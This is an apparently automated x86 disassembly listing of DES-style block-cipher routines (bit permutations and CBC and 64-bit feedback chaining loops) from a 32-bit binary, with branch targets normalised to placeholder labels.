and edx 0x55555555
and edi 0x55555555
xor edx edi
mov edi edx
xor edi eax
lea eax [ edx + edx ]
xor eax ecx
mov ecx [ esp + 0x1c ]
push ecx
push esi
mov [ esi ] edi
mov [ esi + 0x4 ] eax
call sub_10045db0
mov edx [ esp + 0x20 ]
push 0x1
push edx
push esi
call sub_10045db0
mov eax [ esp + 0x28 ]
push 0x0
push eax
push esi
call sub_10045db0
mov ecx [ esi + 0x4 ]
mov eax [ esi ]
mov edx ecx
mov edi eax
shr edx 0x1
and edx 0x55555555
and edi 0x55555555
xor edx edi
add esp 0x24
xor eax edx
add edx edx
xor ecx edx
mov edx eax
shr edx 0x8
mov edi ecx
and edx 0xff00ff
and edi 0xff00ff
xor edx edi
xor ecx edx
shl edx 0x8
xor eax edx
mov edx ecx
shr edx 0x2
mov edi eax
and edx 0x33333333
and edi 0x33333333
xor edx edi
xor eax edx
shl edx 0x2
xor ecx edx
mov edx eax
mov edi ecx
shr edx 0x10
and edi 0xffff
xor edx edi
xor ecx edx
shl edx 0x10
xor eax edx
mov edx ecx
shr edx 0x4
mov edi eax
and edx 0xf0f0f0f
and edi 0xf0f0f0f
xor edx edi
mov edi edx
shl edx 0x4
xor edi eax
xor edx ecx
mov [ esi ] edi
mov [ esi + 0x4 ] edx
pop edi
pop esi
retn
sub_10046500
mov eax 0x10
call sub_1001d0d0
mov eax [ esp + 0x28 ]
push ebx
push ebp
push esi
test eax eax
push edi
je r-xdata
mov eax [ esp + 0x34 ]
xor ebx ebx
xor ecx ecx
xor edx edx
mov bl [ eax ]
mov ch [ eax + 0x1 ]
lea esi [ eax + 0x1 ]
or ebx ecx
mov [ esp + 0x10 ] esi
inc esi
xor eax eax
xor ecx ecx
mov dl [ esi ]
mov al [ esi + 0x1 ]
shl edx 0x10
or ebx edx
inc esi
shl eax 0x18
or ebx eax
inc esi
xor eax eax
xor edx edx
mov al [ esi ]
mov ch [ esi + 0x1 ]
inc esi
or eax ecx
mov ecx [ esp + 0x2c ]
inc esi
add ecx 0xfffffff8
mov dh [ esi + 0x1 ]
mov [ esp + 0x2c ] ecx
mov dl [ esi ]
shl edx 0x10
or eax edx
test ecx ecx
mov [ esp + 0x38 ] eax
jl r-xdata
mov eax [ esp + 0x34 ]
xor edx edx
xor ecx ecx
mov dl [ eax ]
lea esi [ eax + 0x1 ]
xor eax eax
mov [ esp + 0x10 ] esi
mov ah [ esi ]
mov cl [ esi + 0x1 ]
or edx eax
inc esi
shl ecx 0x10
or edx ecx
inc esi
xor eax eax
xor ecx ecx
mov al [ esi ]
mov cl [ esi + 0x1 ]
shl eax 0x18
or edx eax
inc esi
inc esi
xor eax eax
mov ah [ esi ]
or ecx eax
inc esi
xor eax eax
mov ah [ esi + 0x1 ]
mov al [ esi ]
shl eax 0x10
or ecx eax
mov eax [ esp + 0x2c ]
mov [ esp + 0x38 ] ecx
lea ebx [ eax - 0x8 ]
test ebx ebx
jl r-xdata
mov edi [ esp + 0x28 ]
mov esi [ esp + 0x24 ]
jmp r-xdata
lea eax [ ecx + 0x8 ]
mov edi [ esp + 0x28 ]
shr eax 0x3
mov esi [ esp + 0x24 ]
mov [ esp + 0x14 ] eax
neg eax
lea edx [ ecx + eax * 8 ]
mov [ esp + 0x2c ] edx
mov esi [ esp + 0x28 ]
mov edi [ esp + 0x24 ]
jmp r-xdata
lea ebp [ ebx + 0x8 ]
mov esi [ esp + 0x28 ]
shr ebp 0x3
mov edi [ esp + 0x24 ]
mov ecx ebp
neg ecx
lea eax [ ebx + ecx * 8 ]
mov [ esp + 0x2c ] eax
cmp ecx 0xfffffff8
je r-xdata
xor eax eax
xor ecx ecx
mov al [ esi ]
mov ch [ esi + 0x1 ]
inc esi
mov ebp eax
or ebp ecx
inc esi
xor edx edx
xor eax eax
mov dl [ esi ]
mov al [ esi + 0x1 ]
shl edx 0x10
or ebp edx
inc esi
shl eax 0x18
or ebp eax
inc esi
xor eax eax
xor ecx ecx
mov al [ esi ]
mov ch [ esi + 0x1 ]
inc esi
or eax ecx
inc esi
xor edx edx
xor ecx ecx
push 0x0
mov dl [ esi ]
mov cl [ esi + 0x1 ]
shl edx 0x10
or eax edx
inc esi
mov edx [ esp + 0x34 ]
mov [ esp + 0x1c ] ebp
shl ecx 0x18
or eax ecx
push edx
mov [ esp + 0x30 ] eax
mov [ esp + 0x24 ] eax
lea eax [ esp + 0x20 ]
inc esi
push eax
call sub_10045820
mov ecx [ esp + 0x24 ]
mov eax ebx
mov ebx [ esp + 0x28 ]
xor eax ecx
mov ecx [ esp + 0x44 ]
add esp 0xc
xor ecx ebx
mov [ edi ] al
mov edx eax
inc edi
shr edx 0x8
mov [ edi ] dl
mov edx eax
inc edi
mov ebx ebp
shr edx 0x10
mov [ edi ] dl
inc edi
shr eax 0x18
mov [ edi ] al
inc edi
mov eax ecx
mov edx ecx
mov [ edi ] cl
inc edi
shr eax 0x8
mov [ edi ] al
mov eax [ esp + 0x28 ]
inc edi
mov [ esp + 0x38 ] eax
mov eax [ esp + 0x14 ]
shr edx 0x10
mov [ edi ] dl
inc edi
shr ecx 0x18
mov [ edi ] cl
inc edi
dec eax
mov [ esp + 0x14 ] eax
jne r-xdata
mov eax [ esp + 0x38 ]
mov ecx [ esp + 0x2c ]
cmp ebx 0xfffffff8
je r-xdata
xor eax eax
xor ecx ecx
mov al [ edi ]
mov ch [ edi + 0x1 ]
inc edi
or eax ecx
inc edi
xor ecx ecx
xor ebx ebx
push 0x1
mov cl [ edi ]
shl ecx 0x10
or eax ecx
inc edi
xor ecx ecx
mov cl [ edi ]
shl ecx 0x18
or eax ecx
inc edi
xor ecx ecx
xor eax edx
mov cl [ edi ]
mov bh [ edi + 0x1 ]
inc edi
or ecx ebx
inc edi
xor ebx ebx
mov edx [ esp + 0x3c ]
mov [ esp + 0x1c ] eax
mov bl [ edi ]
lea eax [ esp + 0x1c ]
shl ebx 0x10
or ecx ebx
inc edi
xor ebx ebx
mov bl [ edi ]
shl ebx 0x18
or ecx ebx
inc edi
xor ecx edx
mov edx [ esp + 0x34 ]
push edx
push eax
mov [ esp + 0x28 ] ecx
call sub_10045820
mov eax [ esp + 0x24 ]
add esp 0xc
mov [ esi ] al
mov ecx eax
inc esi
mov edx eax
shr ecx 0x8
mov [ esi ] cl
mov ecx eax
inc esi
shr ecx 0x10
mov [ esi ] cl
inc esi
shr eax 0x18
mov [ esi ] al
mov eax [ esp + 0x1c ]
inc esi
mov ebx eax
shr ebx 0x8
mov [ esi ] al
inc esi
mov ecx eax
mov [ esi ] bl
mov ebx eax
inc esi
mov [ esp + 0x38 ] ecx
shr ebx 0x10
mov [ esi ] bl
inc esi
shr eax 0x18
mov [ esi ] al
inc esi
dec ebp
jne r-xdata
mov ebx [ esp + 0x2c ]
mov ecx [ esp + 0x34 ]
mov esi [ esp + 0x10 ]
mov edx ebx
pop edi
shr edx 0x8
mov [ ecx ] bl
mov [ esi ] dl
mov ecx ebx
inc esi
shr ecx 0x10
mov [ esi ] cl
inc esi
shr ebx 0x18
mov [ esi ] bl
inc esi
mov edx eax
mov ecx eax
mov [ esi ] al
inc esi
shr edx 0x8
mov [ esi ] dl
inc esi
shr ecx 0x10
shr eax 0x18
mov [ esi ] cl
mov [ esi + 0x1 ] al
pop esi
pop ebp
pop ebx
add esp 0x10
retn
xor ecx ecx
xor edx edx
mov cl [ esi ]
mov dh [ esi + 0x1 ]
inc esi
mov ebp ecx
or ebp edx
inc esi
xor eax eax
xor ecx ecx
mov al [ esi ]
mov cl [ esi + 0x1 ]
shl eax 0x10
or ebp eax
inc esi
shl ecx 0x18
or ebp ecx
inc esi
xor eax eax
xor edx edx
mov al [ esi ]
mov dh [ esi + 0x1 ]
inc esi
or eax edx
inc esi
xor ecx ecx
mov edx [ esp + 0x30 ]
push 0x0
mov ch [ esi + 0x1 ]
push edx
mov cl [ esi ]
mov [ esp + 0x20 ] ebp
shl ecx 0x10
or eax ecx
mov [ esp + 0x30 ] eax
mov [ esp + 0x24 ] eax
lea eax [ esp + 0x20 ]
push eax
call sub_10045820
mov eax [ esp + 0x24 ]
mov ecx [ esp + 0x38 ]
mov esi [ esp + 0x28 ]
xor ebx eax
mov eax [ esp + 0x44 ]
lea edi [ edi + ecx + 0x8 ]
add ecx 0x7
add esp 0xc
xor eax esi
cmp ecx 0x7
ja r-xdata
mov eax [ esp + 0x34 ]
mov esi [ esp + 0x10 ]
pop edi
mov [ eax ] dl
mov eax edx
shr eax 0x8
mov [ esi ] al
mov eax edx
inc esi
shr eax 0x10
mov [ esi ] al
inc esi
shr edx 0x18
mov [ esi ] dl
inc esi
mov edx ecx
mov eax ecx
mov [ esi ] cl
inc esi
shr edx 0x8
mov [ esi ] dl
inc esi
shr eax 0x10
shr ecx 0x18
mov [ esi ] al
mov [ esi + 0x1 ] cl
pop esi
pop ebp
pop ebx
add esp 0x10
retn
lea eax [ edi + ebx + 0x8 ]
add ebx 0x7
xor ebp ebp
xor edi edi
cmp ebx 0x7
ja r-xdata
mov edx [ esp + 0x28 ]
mov ebx ebp
mov [ esp + 0x38 ] edx
mov eax edx
jmp [ ecx * 4 + jump_table_100469cc ]
xor edi edx
mov edx [ esp + 0x30 ]
push 0x1
lea eax [ esp + 0x1c ]
xor ebp ecx
push edx
push eax
mov [ esp + 0x24 ] edi
mov [ esp + 0x28 ] ebp
call sub_10045820
mov eax [ esp + 0x24 ]
add esp 0xc
mov [ esi ] al
mov ecx eax
inc esi
mov edx eax
shr ecx 0x8
mov [ esi ] cl
mov ecx eax
inc esi
shr ecx 0x10
mov [ esi ] cl
inc esi
shr eax 0x18
mov [ esi ] al
mov eax [ esp + 0x1c ]
inc esi
mov ebx eax
shr ebx 0x8
mov [ esi ] al
inc esi
mov ecx eax
mov [ esi ] bl
mov ebx eax
inc esi
shr ebx 0x10
shr eax 0x18
mov [ esi ] bl
mov [ esi + 0x1 ] al
jmp [ ebx * 4 + jump_table_100469ac ]
mov ecx eax
dec edi
shr ecx 0x18
mov [ edi ] cl
mov edx eax
dec edi
shr edx 0x10
mov [ edi ] dl
mov ecx eax
dec edi
shr ecx 0x8
mov [ edi ] cl
dec edi
mov [ edi ] al
mov edx ebx
dec edi
shr edx 0x18
mov [ edi ] dl
mov eax ebx
dec edi
shr eax 0x10
mov [ edi ] al
mov ecx ebx
dec edi
shr ecx 0x8
mov [ edi ] cl
mov [ edi - 0x1 ] bl
dec eax
xor ebx ebx
mov bl [ eax ]
mov ebp ebx
shl ebp 0x18
dec eax
xor ebx ebx
mov bl [ eax ]
shl ebx 0x10
or ebp ebx
dec eax
xor ebx ebx
mov bh [ eax ]
or ebp ebx
dec eax
xor ebx ebx
mov bl [ eax ]
or ebp ebx
dec eax
xor ebx ebx
mov bl [ eax ]
mov edi ebx
shl edi 0x18
dec eax
xor ebx ebx
mov bl [ eax ]
shl ebx 0x10
or edi ebx
dec eax
xor ebx ebx
mov bh [ eax ]
or edi ebx
xor ebx ebx
mov bl [ eax - 0x1 ]
or edi ebx
sub_100469f0
mov eax 0xc
call sub_1001d0d0
mov eax [ esp + 0x2c ]
push ebx
push ebp
push esi
mov esi [ esp + 0x1c ]
push edi
mov edi [ esp + 0x24 ]
test eax eax
je r-xdata
mov eax [ esp + 0x38 ]
xor ebx ebx
xor edx edx
xor ecx ecx
mov bl [ eax ]
mov dh [ eax + 0x1 ]
lea ebp [ eax + 0x1 ]
or ebx edx
mov [ esp + 0x3c ] ebp
inc ebp
xor eax eax
xor edx edx
mov al [ ebp ]
mov cl [ ebp + 0x1 ]
shl eax 0x10
or ebx eax
inc ebp
shl ecx 0x18
or ebx ecx
inc ebp
xor eax eax
xor ecx ecx
mov al [ ebp ]
mov dh [ ebp + 0x1 ]
inc ebp
or eax edx
mov edx [ esp + 0x28 ]
inc ebp
mov ch [ ebp + 0x1 ]
mov cl [ ebp ]
shl ecx 0x10
or eax ecx
lea ecx [ edx - 0x8 ]
test ecx ecx
mov [ esp + 0x20 ] eax
mov [ esp + 0x28 ] ecx
jl r-xdata
mov eax [ esp + 0x38 ]
xor edx edx
xor ecx ecx
mov dl [ eax ]
lea ebp [ eax + 0x1 ]
xor eax eax
mov [ esp + 0x3c ] ebp
mov ah [ ebp ]
mov cl [ ebp + 0x1 ]
or edx eax
inc ebp
shl ecx 0x10
or edx ecx
inc ebp
xor eax eax
xor ecx ecx
mov al [ ebp ]
shl eax 0x18
or edx eax
inc ebp
xor eax eax
mov al [ ebp ]
mov ch [ ebp + 0x1 ]
inc ebp
or eax ecx
inc ebp
xor ecx ecx
mov ch [ ebp + 0x1 ]
mov cl [ ebp ]
shl ecx 0x10
or eax ecx
mov ecx [ esp + 0x28 ]
mov [ esp + 0x20 ] eax
lea ebx [ ecx - 0x8 ]
test ebx ebx
jl r-xdata
cmp ecx 0xfffffff8
je r-xdata
lea eax [ ecx + 0x8 ]
shr eax 0x3
mov [ esp + 0x10 ] eax
neg eax
lea eax [ ecx + eax * 8 ]
mov [ esp + 0x28 ] eax
cmp ebx 0xfffffff8
je r-xdata
lea ebp [ ebx + 0x8 ]
shr ebp 0x3
mov eax ebp
neg eax
lea ecx [ ebx + eax * 8 ]
mov [ esp + 0x28 ] ecx
mov ecx [ esp + 0x38 ]
mov esi [ esp + 0x3c ]
mov edx ebx
shr edx 0x8
mov [ ecx ] bl
mov [ esi ] dl
mov ecx ebx
inc esi
shr ecx 0x10
mov [ esi ] cl
inc esi
shr ebx 0x18
mov [ esi ] bl
xor ecx ecx
xor edx edx
mov cl [ esi ]
mov dh [ esi + 0x1 ]
inc esi
mov ebp ecx
or ebp edx
inc esi
xor eax eax
xor ecx ecx
mov al [ esi ]
mov cl [ esi + 0x1 ]
shl eax 0x10
or ebp eax
inc esi
shl ecx 0x18
or ebp ecx
inc esi
xor eax eax
xor edx edx
mov al [ esi ]
mov dh [ esi + 0x1 ]
inc esi
or eax edx
inc esi
xor ecx ecx
mov edx [ esp + 0x34 ]
mov [ esp + 0x14 ] ebp
mov ch [ esi + 0x1 ]
push edx
mov cl [ esi ]
lea edx [ esp + 0x18 ]
shl ecx 0x10
or eax ecx
mov ecx [ esp + 0x30 ]
mov [ esp + 0x28 ] eax
mov [ esp + 0x1c ] eax
mov eax [ esp + 0x34 ]
push eax
push ecx
push edx
call sub_100463a0
mov eax [ esp + 0x24 ]
mov ecx [ esp + 0x38 ]
mov esi [ esp + 0x28 ]
xor ebx eax
mov eax [ esp + 0x30 ]
lea edi [ edi + ecx + 0x8 ]
add ecx 0x7
add esp 0x10
xor eax esi
cmp ecx 0x7
ja r-xdata
xor ecx ecx
xor edx edx
mov cl [ esi ]
mov dh [ esi + 0x1 ]
inc esi
mov ebp ecx
or ebp edx
inc esi
xor eax eax
xor ecx ecx
mov al [ esi ]
mov cl [ esi + 0x1 ]
shl eax 0x10
or ebp eax
inc esi
shl ecx 0x18
or ebp ecx
inc esi
xor eax eax
xor edx edx
mov al [ esi ]
mov dh [ esi + 0x1 ]
inc esi
or eax edx
inc esi
xor ecx ecx
xor edx edx
mov [ esp + 0x14 ] ebp
mov cl [ esi ]
mov dl [ esi + 0x1 ]
shl ecx 0x10
or eax ecx
inc esi
mov ecx [ esp + 0x30 ]
shl edx 0x18
or eax edx
mov edx [ esp + 0x2c ]
mov [ esp + 0x24 ] eax
mov [ esp + 0x18 ] eax
mov eax [ esp + 0x34 ]
inc esi
push eax
push ecx
lea eax [ esp + 0x1c ]
push edx
push eax
call sub_100463a0
mov ecx [ esp + 0x24 ]
mov eax ebx
mov ebx [ esp + 0x28 ]
xor eax ecx
mov ecx [ esp + 0x30 ]
add esp 0x10
xor ecx ebx
mov [ edi ] al
mov edx eax
inc edi
shr edx 0x8
mov [ edi ] dl
mov edx eax
inc edi
mov ebx ebp
shr edx 0x10
mov [ edi ] dl
inc edi
shr eax 0x18
mov [ edi ] al
inc edi
mov eax ecx
mov edx ecx
mov [ edi ] cl
inc edi
shr eax 0x8
mov [ edi ] al
inc edi
shr edx 0x10
mov [ edi ] dl
inc edi
shr ecx 0x18
mov [ edi ] cl
inc edi
mov eax [ esp + 0x24 ]
mov [ esp + 0x20 ] eax
mov eax [ esp + 0x10 ]
dec eax
mov [ esp + 0x10 ] eax
jne r-xdata
mov eax [ esp + 0x20 ]
mov ecx [ esp + 0x28 ]
mov ecx [ esp + 0x38 ]
mov esi [ esp + 0x3c ]
mov [ ecx ] dl
mov ecx edx
shr ecx 0x8
mov [ esi ] cl
mov ecx edx
inc esi
shr ecx 0x10
mov [ esi ] cl
inc esi
shr edx 0x18
mov [ esi ] dl
jmp r-xdata
lea ecx [ esi + ebx + 0x8 ]
add ebx 0x7
xor ebp ebp
xor esi esi
cmp ebx 0x7
ja r-xdata
xor eax eax
xor ecx ecx
mov al [ esi ]
mov ch [ esi + 0x1 ]
inc esi
or eax ecx
inc esi
xor ecx ecx
xor ebx ebx
mov cl [ esi ]
shl ecx 0x10
or eax ecx
inc esi
xor ecx ecx
mov cl [ esi ]
shl ecx 0x18
or eax ecx
inc esi
xor ecx ecx
xor eax edx
mov cl [ esi ]
mov bh [ esi + 0x1 ]
inc esi
or ecx ebx
inc esi
xor ebx ebx
mov edx [ esp + 0x20 ]
mov [ esp + 0x14 ] eax
mov bl [ esi ]
mov eax [ esp + 0x30 ]
shl ebx 0x10
or ecx ebx
inc esi
xor ebx ebx
mov bl [ esi ]
shl ebx 0x18
or ecx ebx
inc esi
xor ecx edx
mov edx [ esp + 0x34 ]
mov [ esp + 0x18 ] ecx
mov ecx [ esp + 0x2c ]
push edx
push eax
lea edx [ esp + 0x1c ]
push ecx
push edx
call sub_10046240
mov eax [ esp + 0x24 ]
add esp 0x10
mov [ edi ] al
mov ebx eax
inc edi
mov ecx [ esp + 0x18 ]
shr ebx 0x8
mov [ edi ] bl
mov ebx eax
inc edi
mov edx eax
shr ebx 0x10
mov [ edi ] bl
inc edi
shr eax 0x18
mov [ edi ] al
inc edi
mov eax ecx
mov [ esp + 0x20 ] ecx
mov [ edi ] cl
inc edi
shr eax 0x8
mov [ edi ] al
mov eax ecx
inc edi
shr eax 0x10
mov [ edi ] al
inc edi
shr ecx 0x18
mov [ edi ] cl
inc edi
dec ebp
jne r-xdata
mov eax [ esp + 0x20 ]
mov ebx [ esp + 0x28 ]
mov edx [ esp + 0x24 ]
mov ebx ebp
mov [ esp + 0x20 ] edx
mov eax edx
jmp [ ecx * 4 + jump_table_10046ea4 ]
inc esi
mov edx eax
shr edx 0x8
mov [ esi ] al
inc esi
mov ecx eax
pop edi
mov [ esi ] dl
inc esi
shr ecx 0x10
shr eax 0x18
mov [ esi ] cl
mov [ esi + 0x1 ] al
pop esi
pop ebp
pop ebx
add esp 0xc
retn
mov ecx [ esp + 0x34 ]
xor esi edx
mov edx [ esp + 0x30 ]
xor ebp eax
mov eax [ esp + 0x2c ]
push ecx
push edx
lea ecx [ esp + 0x1c ]
push eax
push ecx
mov [ esp + 0x24 ] esi
mov [ esp + 0x28 ] ebp
call sub_10046240
mov ecx [ esp + 0x24 ]
add esp 0x10
mov [ edi ] cl
mov ebx ecx
inc edi
mov eax [ esp + 0x18 ]
shr ebx 0x8
mov [ edi ] bl
mov ebx ecx
inc edi
mov edx ecx
shr ebx 0x10
mov [ edi ] bl
inc edi
shr ecx 0x18
mov [ edi ] cl
inc edi
mov ecx eax
mov [ edi ] cl
mov ebx ecx
inc edi
shr ebx 0x8
mov [ edi ] bl
mov ebx ecx
inc edi
shr ebx 0x10
shr ecx 0x18
mov [ edi ] bl
mov [ edi + 0x1 ] cl
jmp [ ebx * 4 + jump_table_10046e84 ]
mov ecx eax
dec edi
shr ecx 0x18
mov [ edi ] cl
mov edx eax
dec edi
shr edx 0x10
mov [ edi ] dl
mov ecx eax
dec edi
shr ecx 0x8
mov [ edi ] cl
dec edi
mov [ edi ] al
mov edx ebx
dec edi
shr edx 0x18
mov [ edi ] dl
mov eax ebx
dec edi
shr eax 0x10
mov [ edi ] al
mov ecx ebx
dec edi
shr ecx 0x8
mov [ edi ] cl
mov [ edi - 0x1 ] bl
dec ecx
xor ebx ebx
mov bl [ ecx ]
mov ebp ebx
shl ebp 0x18
dec ecx
xor ebx ebx
mov bl [ ecx ]
shl ebx 0x10
or ebp ebx
dec ecx
xor ebx ebx
mov bh [ ecx ]
or ebp ebx
dec ecx
xor ebx ebx
mov bl [ ecx ]
or ebp ebx
dec ecx
xor ebx ebx
mov bl [ ecx ]
mov esi ebx
shl esi 0x18
dec ecx
xor ebx ebx
mov bl [ ecx ]
shl ebx 0x10
or esi ebx
dec ecx
xor ebx ebx
mov bh [ ecx ]
or esi ebx
xor ebx ebx
mov bl [ ecx - 0x1 ]
or esi ebx
sub_10046ed0
mov eax 0x8
call sub_1001d0d0
mov edx [ esp + 0x28 ]
mov eax [ esp + 0x2c ]
push ebx
push ebp
push esi
mov esi [ edx ]
test eax eax
mov eax [ esp + 0x20 ]
push edi
je r-xdata
test eax eax
je r-xdata
test eax eax
je r-xdata
mov [ edx ] esi
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
retn
mov edi [ esp + 0x34 ]
mov [ esp + 0x24 ] eax
mov edi [ esp + 0x34 ]
mov [ esp + 0x24 ] eax
mov ecx [ esp + 0x1c ]
mov al [ ecx ]
inc ecx
mov [ esp + 0x1c ] ecx
mov cl [ esi + edi ]
mov [ esi + edi ] al
xor al cl
mov ecx [ esp + 0x20 ]
mov [ ecx ] al
mov eax [ esp + 0x24 ]
inc ecx
inc esi
and esi 0x7
dec eax
mov [ esp + 0x20 ] ecx
mov [ esp + 0x24 ] eax
jne r-xdata
lea ebp [ edi + 0x1 ]
xor ecx ecx
mov cl [ edi ]
mov eax ebp
xor edx edx
xor ebx ebx
mov dh [ eax ]
or ecx edx
inc eax
xor edx edx
mov dl [ eax ]
shl edx 0x10
or ecx edx
inc eax
xor edx edx
mov dl [ eax ]
shl edx 0x18
or ecx edx
inc eax
xor edx edx
mov [ esp + 0x10 ] ecx
mov dl [ eax ]
mov bh [ eax + 0x1 ]
inc eax
or edx ebx
inc eax
xor ecx ecx
mov ch [ eax + 0x1 ]
mov cl [ eax ]
mov eax [ esp + 0x2c ]
shl ecx 0x10
or ecx edx
mov edx [ esp + 0x30 ]
mov [ esp + 0x14 ] ecx
mov ecx [ esp + 0x28 ]
push edx
push eax
lea edx [ esp + 0x18 ]
push ecx
push edx
call sub_10046240
mov ecx [ esp + 0x20 ]
mov eax ebp
mov edx ecx
mov [ edi ] cl
shr edx 0x8
mov [ eax ] dl
add esp 0x10
mov edx ecx
inc eax
shr edx 0x10
mov [ eax ] dl
inc eax
shr ecx 0x18
mov [ eax ] cl
mov ecx [ esp + 0x14 ]
inc eax
mov edx ecx
shr edx 0x8
mov [ eax ] cl
inc eax
mov [ eax ] dl
mov edx ecx
inc eax
shr edx 0x10
shr ecx 0x18
mov [ eax ] dl
mov edx [ esp + 0x38 ]
mov [ eax + 0x1 ] cl
mov ecx [ esp + 0x1c ]
mov al [ esi + edi ]
mov bl [ ecx ]
xor al bl
inc ecx
mov [ esp + 0x1c ] ecx
mov ecx [ esp + 0x20 ]
mov [ ecx ] al
inc ecx
mov [ esi + edi ] al
mov eax [ esp + 0x24 ]
inc esi
mov [ esp + 0x20 ] ecx
and esi 0x7
dec eax
mov [ esp + 0x24 ] eax
jne r-xdata
lea ebp [ edi + 0x1 ]
xor ecx ecx
mov cl [ edi ]
mov eax ebp
xor edx edx
xor ebx ebx
mov dh [ eax ]
or ecx edx
inc eax
xor edx edx
mov dl [ eax ]
shl edx 0x10
or ecx edx
inc eax
xor edx edx
mov dl [ eax ]
shl edx 0x18
or ecx edx
inc eax
xor edx edx
mov [ esp + 0x10 ] ecx
mov dl [ eax ]
mov bh [ eax + 0x1 ]
inc eax
or edx ebx
inc eax
xor ecx ecx
mov ch [ eax + 0x1 ]
mov cl [ eax ]
mov eax [ esp + 0x2c ]
shl ecx 0x10
or ecx edx
mov edx [ esp + 0x30 ]
mov [ esp + 0x14 ] ecx
mov ecx [ esp + 0x28 ]
push edx
push eax
lea edx [ esp + 0x18 ]
push ecx
push edx
call sub_10046240
mov ecx [ esp + 0x20 ]
mov eax ebp
mov edx ecx
mov [ edi ] cl
shr edx 0x8
mov [ eax ] dl
add esp 0x10
mov edx ecx
inc eax
shr edx 0x10
mov [ eax ] dl
inc eax
shr ecx 0x18
mov [ eax ] cl
mov ecx [ esp + 0x14 ]
inc eax
mov edx ecx
shr edx 0x8
mov [ eax ] cl
inc eax
mov [ eax ] dl
mov edx ecx
inc eax
shr edx 0x10
shr ecx 0x18
mov [ eax ] dl
mov edx [ esp + 0x38 ]
mov [ eax + 0x1 ] cl
test esi esi
jne r-xdata
test esi esi
jne r-xdata
mov [ edx ] esi
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
retn
sub_100470e0
mov eax 0x24
call sub_1001d0d0
mov eax [ esp + 0x30 ]
push ebp
mov ebp [ esp + 0x38 ]
push edi
lea edi [ eax + 0x7 ]
mov [ esp + 0x8 ] ebp
shr edi 0x3
cmp eax 0x40
jg r-xdata
pop edi
pop ebp
add esp 0x24
retn
mov eax [ esp + 0x4c ]
push ebx
xor ebx ebx
push esi
mov bl [ eax ]
lea esi [ eax + 0x1 ]
xor eax eax
mov [ esp + 0x18 ] esi
mov ah [ esi ]
xor ecx ecx
mov cl [ esi + 0x1 ]
or ebx eax
inc esi
xor edx edx
shl ecx 0x10
mov dl [ esi + 0x1 ]
or ebx ecx
inc esi
xor eax eax
shl edx 0x18
mov al [ esi + 0x1 ]
or ebx edx
inc esi
xor ecx ecx
inc esi
xor edx edx
mov ch [ esi ]
mov dh [ esi + 0x2 ]
mov dl [ esi + 0x1 ]
or eax ecx
inc esi
mov ecx [ esp + 0x58 ]
shl edx 0x10
or eax edx
test ecx ecx
mov [ esp + 0x44 ] eax
je r-xdata
cmp ebp edi
jb r-xdata
cmp ebp edi
jb r-xdata
mov edx [ esp + 0x54 ]
mov esi [ esp + 0x18 ]
mov ecx ebx
shr ecx 0x8
mov [ edx ] bl
mov [ esi ] cl
mov edx ebx
inc esi
shr edx 0x10
mov [ esi ] dl
inc esi
shr ebx 0x18
mov [ esi ] bl
inc esi
mov ecx eax
mov edx eax
mov [ esi ] al
inc esi
shr ecx 0x8
mov [ esi ] cl
inc esi
shr edx 0x10
shr eax 0x18
mov [ esi ] dl
mov [ esi + 0x1 ] al
pop esi
pop ebx
mov ebp [ esp + 0x38 ]
mov ebp [ esp + 0x38 ]
mov esi [ esp + 0x40 ]
add ebp edi
cmp esi 0x20
jne r-xdata
jmp [ edx * 4 + jump_table_10047718 ]
mov esi [ esp + 0x20 ]
mov edx [ esp + 0x1c ]
xor ecx esi
mov esi [ esp + 0x3c ]
xor eax edx
lea edx [ edi - 0x1 ]
add ebp edi
add esi edi
cmp edx 0x7
ja r-xdata
jmp [ edx * 4 + jump_table_100476d8 ]
cmp esi 0x40
jne r-xdata
mov ebx [ esp + 0x44 ]
mov [ esp + 0x44 ] eax
jmp r-xdata
dec ebp
xor eax eax
mov al [ ebp ]
shl eax 0x18
mov [ esp + 0x14 ] eax
mov ecx eax
dec ebp
xor eax eax
mov al [ ebp ]
shl eax 0x10
or ecx eax
dec ebp
xor edx edx
mov dh [ ebp ]
or ecx edx
dec ebp
xor eax eax
mov al [ ebp ]
or ecx eax
mov [ esp + 0x14 ] ecx
dec ebp
xor eax eax
mov al [ ebp ]
shl eax 0x18
mov [ esp + 0x58 ] eax
dec ebp
xor edx edx
mov dl [ ebp ]
shl edx 0x10
or eax edx
dec ebp
xor edx edx
mov dh [ ebp ]
or eax edx
dec ebp
xor edx edx
mov dl [ ebp ]
or eax edx
mov [ esp + 0x58 ] eax
add esi edi
mov [ esp + 0x3c ] esi
mov esi [ esp + 0x40 ]
cmp esi 0x20
jne r-xdata
jmp [ edx * 4 + jump_table_100476f8 ]
dec ebp
xor ecx ecx
mov cl [ ebp ]
shl ecx 0x18
dec ebp
xor edx edx
mov dl [ ebp ]
shl edx 0x10
or ecx edx
dec ebp
xor eax eax
mov ah [ ebp ]
or ecx eax
dec ebp
xor edx edx
mov dl [ ebp ]
or ecx edx
dec ebp
xor eax eax
mov al [ ebp ]
shl eax 0x18
dec ebp
xor edx edx
mov dl [ ebp ]
shl edx 0x10
or eax edx
dec ebp
xor edx edx
mov dh [ ebp ]
or eax edx
dec ebp
xor edx edx
mov dl [ ebp ]
or eax edx
mov edx ebx
mov [ esp + 0x24 ] bl
shr edx 0x8
mov [ esp + 0x25 ] dl
mov edx ebx
shr edx 0x10
mov [ esp + 0x26 ] dl
mov edx [ esp + 0x44 ]
shr ebx 0x18
mov [ esp + 0x27 ] bl
mov ebx edx
shr ebx 0x8
mov [ esp + 0x29 ] bl
mov [ esp + 0x28 ] dl
mov ebx edx
mov [ esp + 0x2c ] al
shr edx 0x18
mov [ esp + 0x2b ] dl
mov edx eax
shr edx 0x8
mov [ esp + 0x2d ] dl
mov edx eax
shr edx 0x10
shr eax 0x18
shr ebx 0x10
mov [ esp + 0x2e ] dl
mov [ esp + 0x2f ] al
mov [ esp + 0x2a ] bl
mov eax ecx
mov edx ecx
mov [ esp + 0x30 ] cl
mov ebx esi
shr eax 0x8
shr edx 0x10
shr ecx 0x18
and ebx 0x80000007
mov [ esp + 0x31 ] al
mov [ esp + 0x32 ] dl
mov [ esp + 0x33 ] cl
jns r-xdata
mov ebx eax
mov [ esp + 0x44 ] ecx
jmp r-xdata
mov esi [ esp + 0x20 ]
mov edx [ esp + 0x1c ]
xor ecx esi
mov esi [ esp + 0x3c ]
xor eax edx
lea edx [ edi - 0x1 ]
add esi edi
cmp edx 0x7
ja r-xdata
cmp esi 0x40
jne r-xdata
mov ebx [ esp + 0x44 ]
